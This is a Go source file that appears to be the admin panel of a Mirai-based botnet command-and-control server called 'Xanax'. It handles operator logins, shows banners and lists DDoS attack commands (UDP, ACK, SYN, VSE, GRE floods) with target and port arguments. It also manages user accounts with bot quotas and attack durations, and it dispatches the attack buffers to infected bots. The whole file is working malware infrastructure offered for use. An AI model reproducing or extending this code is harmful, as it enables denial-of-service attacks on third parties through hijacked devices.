package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[0;34mпользователь\033[37;3m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[0;34mпароль\033[37;3m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[37;1mChecking Account ..\x1b[0;34m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(100) * time.Millisecond)
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\x1b[0;31mIncorrect Login Details\r\n"))
        this.conn.Write([]byte("\x1b[0;31mPress Any Key To Exit.\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
	
	this.conn.Write([]byte("\033[2J\033[1;1H"))
                                                                      
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r \x1b[0;34m██\x1b[0;37m╗  \x1b[0;34m██\x1b[0;37m╗ \x1b[0;34m█████\x1b[0;37m╗ \x1b[0;34m███\x1b[0;37m╗   \x1b[0;34m██\x1b[0;37m╗ \x1b[0;34m█████\x1b[0;37m╗ \x1b[0;34m██\x1b[0;37m╗  \x1b[0;34m██\x1b[0;37m╗\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m╚\x1b[0;34m██\x1b[0;37m╗\x1b[0;34m██\x1b[0;37m╔╝\x1b[0;34m██\x1b[0;37m╔══\x1b[0;34m██\x1b[0;37m╗\x1b[0;34m████\x1b[0;37m╗  \x1b[0;34m██\x1b[0;37m║\x1b[0;34m██\x1b[0;37m╔══\x1b[0;34m██\x1b[0;37m╗╚\x1b[0;34m██\x1b[0;37m╗\x1b[0;34m██\x1b[0;37m╔╝\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m ╚\x1b[0;34m███\x1b[0;37m╔╝ \x1b[0;34m███████\x1b[0;37m║\x1b[0;34m██\x1b[0;37m╔\x1b[0;34m██\x1b[0;37m╗ \x1b[0;34m██\x1b[0;37m║\x1b[0;34m███████\x1b[0;37m║ ╚\x1b[0;34m███\x1b[0;37m╔╝ \r\n"))
	this.conn.Write([]byte("\r \x1b[0;34m ██\x1b[0;37m╔\x1b[0;34m██\x1b[0;37m╗ \x1b[0;34m██\x1b[0;37m╔══\x1b[0;34m██\x1b[0;37m║\x1b[0;34m██\x1b[0;37m║╚\x1b[0;34m██\x1b[0;37m╗\x1b[0;34m██\x1b[0;37m║\x1b[0;34m██\x1b[0;37m╔══\x1b[0;34m██\x1b[0;37m║\x1b[0;34m ██\x1b[0;37m╔\x1b[0;34m██\x1b[0;37m╗ \r\n"))
	this.conn.Write([]byte("\r \x1b[0;34m██\x1b[0;37m╔╝ \x1b[0;34m██\x1b[0;37m╗\x1b[0;34m██\x1b[0;37m║  \x1b[0;34m██\x1b[0;37m║\x1b[0;34m██\x1b[0;37m║ ╚\x1b[0;34m████\x1b[0;37m║\x1b[0;34m██\x1b[0;37m║  \x1b[0;34m██\x1b[0;37m║\x1b[0;34m██\x1b[0;37m╔╝\x1b[0;34m ██\x1b[0;37m╗\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝\r\n"))
	this.conn.Write([]byte("\r   \x1b[0;34m*** \x1b[0;37mWelcome To Xanax | Version 1.0 \x1b[0;34m***\r\n"))
	this.conn.Write([]byte("\r       \x1b[0;34m*** \x1b[0;37mPowered By Mirai #Reps \x1b[0;34m***\r\n"))
	this.conn.Write([]byte("\r\n"))


    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots 
            } else {
                BotCount = clientList.Count() 
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Loaded: %d\007", BotCount))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

    for {
        var botCatagory string
        var botCount int
		
        this.conn.Write([]byte("\x1b[0;34m%s\x1b[0;37m@\x1b[0;34mBotnet\x1b[0;37m# \033[0m", username))
		
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
		if cmd == "clear" || cmd == "cls" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r \x1b[0;34m██\x1b[0;37m╗  \x1b[0;34m██\x1b[0;37m╗ \x1b[0;34m█████\x1b[0;37m╗ \x1b[0;34m███\x1b[0;37m╗   \x1b[0;34m██\x1b[0;37m╗ \x1b[0;34m█████\x1b[0;37m╗ \x1b[0;34m██\x1b[0;37m╗  \x1b[0;34m██\x1b[0;37m╗\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m╚\x1b[0;34m██\x1b[0;37m╗\x1b[0;34m██\x1b[0;37m╔╝\x1b[0;34m██\x1b[0;37m╔══\x1b[0;34m██\x1b[0;37m╗\x1b[0;34m████\x1b[0;37m╗  \x1b[0;34m██\x1b[0;37m║\x1b[0;34m██\x1b[0;37m╔══\x1b[0;34m██\x1b[0;37m╗╚\x1b[0;34m██\x1b[0;37m╗\x1b[0;34m██\x1b[0;37m╔╝\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m ╚\x1b[0;34m███\x1b[0;37m╔╝ \x1b[0;34m███████\x1b[0;37m║\x1b[0;34m██\x1b[0;37m╔\x1b[0;34m██\x1b[0;37m╗ \x1b[0;34m██\x1b[0;37m║\x1b[0;34m███████\x1b[0;37m║ ╚\x1b[0;34m███\x1b[0;37m╔╝ \r\n"))
	this.conn.Write([]byte("\r \x1b[0;34m ██\x1b[0;37m╔\x1b[0;34m██\x1b[0;37m╗ \x1b[0;34m██\x1b[0;37m╔══\x1b[0;34m██\x1b[0;37m║\x1b[0;34m██\x1b[0;37m║╚\x1b[0;34m██\x1b[0;37m╗\x1b[0;34m██\x1b[0;37m║\x1b[0;34m██\x1b[0;37m╔══\x1b[0;34m██\x1b[0;37m║\x1b[0;34m ██\x1b[0;37m╔\x1b[0;34m██\x1b[0;37m╗ \r\n"))
	this.conn.Write([]byte("\r \x1b[0;34m██\x1b[0;37m╔╝ \x1b[0;34m██\x1b[0;37m╗\x1b[0;34m██\x1b[0;37m║  \x1b[0;34m██\x1b[0;37m║\x1b[0;34m██\x1b[0;37m║ ╚\x1b[0;34m████\x1b[0;37m║\x1b[0;34m██\x1b[0;37m║  \x1b[0;34m██\x1b[0;37m║\x1b[0;34m██\x1b[0;37m╔╝\x1b[0;34m ██\x1b[0;37m╗\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝\r\n"))
	this.conn.Write([]byte("\r   \x1b[0;34m*** \x1b[0;37mWelcome To Xanax | Version 1.0 \x1b[0;34m***\r\n"))
	this.conn.Write([]byte("\r       \x1b[0;34m*** \x1b[0;37mPowered By Mirai #Reps \x1b[0;34m***\r\n"))
	this.conn.Write([]byte("\r\n"))
			continue
		}
		if cmd == "red" || cmd == "RED" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r \x1b[0;31m██\x1b[0;37m╗  \x1b[0;31m██\x1b[0;37m╗ \x1b[0;31m█████\x1b[0;37m╗ \x1b[0;31m███\x1b[0;37m╗   \x1b[0;31m██\x1b[0;37m╗ \x1b[0;31m█████\x1b[0;37m╗ \x1b[0;31m██\x1b[0;37m╗  \x1b[0;31m██\x1b[0;37m╗\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m╚\x1b[0;31m██\x1b[0;37m╗\x1b[0;31m██\x1b[0;37m╔╝\x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m╗\x1b[0;31m████\x1b[0;37m╗  \x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m╗╚\x1b[0;31m██\x1b[0;37m╗\x1b[0;31m██\x1b[0;37m╔╝\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m ╚\x1b[0;31m███\x1b[0;37m╔╝ \x1b[0;31m███████\x1b[0;37m║\x1b[0;31m██\x1b[0;37m╔\x1b[0;31m██\x1b[0;37m╗ \x1b[0;31m██\x1b[0;37m║\x1b[0;31m███████\x1b[0;37m║ ╚\x1b[0;31m███\x1b[0;37m╔╝ \r\n"))
	this.conn.Write([]byte("\r \x1b[0;31m ██\x1b[0;37m╔\x1b[0;31m██\x1b[0;37m╗ \x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m║╚\x1b[0;31m██\x1b[0;37m╗\x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m║\x1b[0;31m ██\x1b[0;37m╔\x1b[0;31m██\x1b[0;37m╗ \r\n"))
	this.conn.Write([]byte("\r \x1b[0;31m██\x1b[0;37m╔╝ \x1b[0;31m██\x1b[0;37m╗\x1b[0;31m██\x1b[0;37m║  \x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m║ ╚\x1b[0;31m████\x1b[0;37m║\x1b[0;31m██\x1b[0;37m║  \x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m╔╝\x1b[0;31m ██\x1b[0;37m╗\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝\r\n"))
	this.conn.Write([]byte("\r   \x1b[0;31m*** \x1b[0;37mWelcome To Xanax | Version 1.0 \x1b[0;31m***\r\n"))
	this.conn.Write([]byte("\r       \x1b[0;31m*** \x1b[0;37mPowered By Mirai #Reps \x1b[0;31m***\r\n"))
	this.conn.Write([]byte("\r\n"))
			continue
		}
		if cmd == "white" || cmd == "WHITE" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m██\x1b[0;37m╗  \x1b[0;37m██\x1b[0;37m╗ \x1b[0;37m█████\x1b[0;37m╗ \x1b[0;37m███\x1b[0;37m╗   \x1b[0;37m██\x1b[0;37m╗ \x1b[0;37m█████\x1b[0;37m╗ \x1b[0;37m██\x1b[0;37m╗  \x1b[0;37m██\x1b[0;37m╗\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m╚\x1b[0;37m██\x1b[0;37m╗\x1b[0;37m██\x1b[0;37m╔╝\x1b[0;37m██\x1b[0;37m╔══\x1b[0;37m██\x1b[0;37m╗\x1b[0;37m████\x1b[0;37m╗  \x1b[0;37m██\x1b[0;37m║\x1b[0;37m██\x1b[0;37m╔══\x1b[0;37m██\x1b[0;37m╗╚\x1b[0;37m██\x1b[0;37m╗\x1b[0;37m██\x1b[0;37m╔╝\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m ╚\x1b[0;37m███\x1b[0;37m╔╝ \x1b[0;37m███████\x1b[0;37m║\x1b[0;37m██\x1b[0;37m╔\x1b[0;37m██\x1b[0;37m╗ \x1b[0;37m██\x1b[0;37m║\x1b[0;37m███████\x1b[0;37m║ ╚\x1b[0;37m███\x1b[0;37m╔╝ \r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m ██\x1b[0;37m╔\x1b[0;37m██\x1b[0;37m╗ \x1b[0;37m██\x1b[0;37m╔══\x1b[0;37m██\x1b[0;37m║\x1b[0;37m██\x1b[0;37m║╚\x1b[0;37m██\x1b[0;37m╗\x1b[0;37m██\x1b[0;37m║\x1b[0;37m██\x1b[0;37m╔══\x1b[0;37m██\x1b[0;37m║\x1b[0;37m ██\x1b[0;37m╔\x1b[0;37m██\x1b[0;37m╗ \r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m██\x1b[0;37m╔╝ \x1b[0;37m██\x1b[0;37m╗\x1b[0;37m██\x1b[0;37m║  \x1b[0;37m██\x1b[0;37m║\x1b[0;37m██\x1b[0;37m║ ╚\x1b[0;37m████\x1b[0;37m║\x1b[0;37m██\x1b[0;37m║  \x1b[0;37m██\x1b[0;37m║\x1b[0;37m██\x1b[0;37m╔╝\x1b[0;37m ██\x1b[0;37m╗\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝\r\n"))
	this.conn.Write([]byte("\r   \x1b[0;37m*** \x1b[0;37mWelcome To Xanax | Version 1.0 \x1b[0;37m***\r\n"))
	this.conn.Write([]byte("\r       \x1b[0;37m*** \x1b[0;37mPowered By Mirai #Reps \x1b[0;37m***\r\n"))
	this.conn.Write([]byte("\r\n"))
			continue
		}
		if cmd == "cyan" || cmd == "CYAN" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r \x1b[0;36m██\x1b[0;37m╗  \x1b[0;36m██\x1b[0;37m╗ \x1b[0;36m█████\x1b[0;37m╗ \x1b[0;36m███\x1b[0;37m╗   \x1b[0;36m██\x1b[0;37m╗ \x1b[0;36m█████\x1b[0;37m╗ \x1b[0;36m██\x1b[0;37m╗  \x1b[0;36m██\x1b[0;37m╗\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m╚\x1b[0;36m██\x1b[0;37m╗\x1b[0;36m██\x1b[0;37m╔╝\x1b[0;36m██\x1b[0;37m╔══\x1b[0;36m██\x1b[0;37m╗\x1b[0;36m████\x1b[0;37m╗  \x1b[0;36m██\x1b[0;37m║\x1b[0;36m██\x1b[0;37m╔══\x1b[0;36m██\x1b[0;37m╗╚\x1b[0;36m██\x1b[0;37m╗\x1b[0;36m██\x1b[0;37m╔╝\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m ╚\x1b[0;36m███\x1b[0;37m╔╝ \x1b[0;36m███████\x1b[0;37m║\x1b[0;36m██\x1b[0;37m╔\x1b[0;36m██\x1b[0;37m╗ \x1b[0;36m██\x1b[0;37m║\x1b[0;36m███████\x1b[0;37m║ ╚\x1b[0;36m███\x1b[0;37m╔╝ \r\n"))
	this.conn.Write([]byte("\r \x1b[0;36m ██\x1b[0;37m╔\x1b[0;36m██\x1b[0;37m╗ \x1b[0;36m██\x1b[0;37m╔══\x1b[0;36m██\x1b[0;37m║\x1b[0;36m██\x1b[0;37m║╚\x1b[0;36m██\x1b[0;37m╗\x1b[0;36m██\x1b[0;37m║\x1b[0;36m██\x1b[0;37m╔══\x1b[0;36m██\x1b[0;37m║\x1b[0;36m ██\x1b[0;37m╔\x1b[0;36m██\x1b[0;37m╗ \r\n"))
	this.conn.Write([]byte("\r \x1b[0;36m██\x1b[0;37m╔╝ \x1b[0;36m██\x1b[0;37m╗\x1b[0;36m██\x1b[0;37m║  \x1b[0;36m██\x1b[0;37m║\x1b[0;36m██\x1b[0;37m║ ╚\x1b[0;36m████\x1b[0;37m║\x1b[0;36m██\x1b[0;37m║  \x1b[0;36m██\x1b[0;37m║\x1b[0;36m██\x1b[0;37m╔╝\x1b[0;36m ██\x1b[0;37m╗\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝\r\n"))
	this.conn.Write([]byte("\r   \x1b[0;36m*** \x1b[0;37mWelcome To Xanax | Version 1.0 \x1b[0;36m***\r\n"))
	this.conn.Write([]byte("\r       \x1b[0;36m*** \x1b[0;37mPowered By Mirai #Reps \x1b[0;36m***\r\n"))
	this.conn.Write([]byte("\r\n"))
			continue
		}
		if cmd == "pink" || cmd == "PINK" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r \x1b[0;35m██\x1b[0;37m╗  \x1b[0;35m██\x1b[0;37m╗ \x1b[0;35m█████\x1b[0;37m╗ \x1b[0;35m███\x1b[0;37m╗   \x1b[0;35m██\x1b[0;37m╗ \x1b[0;35m█████\x1b[0;37m╗ \x1b[0;35m██\x1b[0;37m╗  \x1b[0;35m██\x1b[0;37m╗\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m╚\x1b[0;35m██\x1b[0;37m╗\x1b[0;35m██\x1b[0;37m╔╝\x1b[0;35m██\x1b[0;37m╔══\x1b[0;35m██\x1b[0;37m╗\x1b[0;35m████\x1b[0;37m╗  \x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m╔══\x1b[0;35m██\x1b[0;37m╗╚\x1b[0;35m██\x1b[0;37m╗\x1b[0;35m██\x1b[0;37m╔╝\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m ╚\x1b[0;35m███\x1b[0;37m╔╝ \x1b[0;35m███████\x1b[0;37m║\x1b[0;35m██\x1b[0;37m╔\x1b[0;35m██\x1b[0;37m╗ \x1b[0;35m██\x1b[0;37m║\x1b[0;35m███████\x1b[0;37m║ ╚\x1b[0;35m███\x1b[0;37m╔╝ \r\n"))
	this.conn.Write([]byte("\r \x1b[0;35m ██\x1b[0;37m╔\x1b[0;35m██\x1b[0;37m╗ \x1b[0;35m██\x1b[0;37m╔══\x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m║╚\x1b[0;35m██\x1b[0;37m╗\x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m╔══\x1b[0;35m██\x1b[0;37m║\x1b[0;35m ██\x1b[0;37m╔\x1b[0;35m██\x1b[0;37m╗ \r\n"))
	this.conn.Write([]byte("\r \x1b[0;35m██\x1b[0;37m╔╝ \x1b[0;35m██\x1b[0;37m╗\x1b[0;35m██\x1b[0;37m║  \x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m║ ╚\x1b[0;35m████\x1b[0;37m║\x1b[0;35m██\x1b[0;37m║  \x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m╔╝\x1b[0;35m ██\x1b[0;37m╗\r\n"))
	this.conn.Write([]byte("\r \x1b[0;37m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝\r\n"))
	this.conn.Write([]byte("\r   \x1b[0;35m*** \x1b[0;37mWelcome To Xanax | Version 1.0 \x1b[0;35m***\r\n"))
	this.conn.Write([]byte("\r       \x1b[0;35m*** \x1b[0;37mPowered By Mirai #Reps \x1b[0;35m***\r\n"))
	this.conn.Write([]byte("\r\n"))
			continue
		}
		if cmd == "HELP" || cmd == "help" || cmd == "?" {
			this.conn.Write([]byte("\r\x1b[0;34mAttack Commands:\r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m[\x1b[0;34mUDP\x1b[0;37m] udp <Target> <Port> dport=<Port>\r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m[\x1b[0;34mACK\x1b[0;37m] ack <Target> <Port> dport=<Port>\r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m[\x1b[0;34mVSE\x1b[0;37m] vse <Target> <Port> dport=<Port>\r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m[\x1b[0;34mSYN\x1b[0;37m] syn <Target> <Port> dport=<Port>\r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m[\x1b[0;34mGreIP\x1b[0;37m] greip <Target> <Port> dport=<Port>\r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m[\x1b[0;34mGreeth\x1b[0;37m] greeth <Target> <Port> dport=<Port>\r\n"))
			this.conn.Write([]byte("\n\r\x1b[0;34mServer Commands:\r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m[\x1b[0;34mClear\x1b[0;37m] cls or clear\r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m[\x1b[0;34mBotCount\x1b[0;37m] bots or count\r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m[\x1b[0;34mHelp\x1b[0;37m] help or ?\r\n"))
			continue
		}
        if cmd == "" {
            continue
        }
		
        botCount = userInfo.maxBots 

        if userInfo.admin == 1 && cmd == "adduser" || cmd == "addadmin" {
            this.conn.Write([]byte("Enter New Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter New Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter Wanted Bot Count (-1 For Full Net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;34m%s\033[0m\r\n", "Failed To Parse The Bot Count")))
                continue
            }
            this.conn.Write([]byte("Max Attack Duration (-1 For None): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;34m%s\033[0m\r\n", "Failed To Parse The Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown Time (0 For None): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;34m%s\033[0m\r\n", "Failed To Parse The Cooldown")))
                continue
            }
            this.conn.Write([]byte("New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (Y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;34m%s\033[0m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[0;36mUser Added Successfully!\033[0m\r\n"))
            }
            continue
        }
        if userInfo.admin == 1 && cmd == "botcount" || cmd == "bots" || cmd == "count" {
            m := clientList.Distribution() 
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;37m%s:\t%d\033[0m\r\n", k, v) ))
            }
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;34mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;34mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\x1b[0;34m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;34m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\x1b[0;34m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}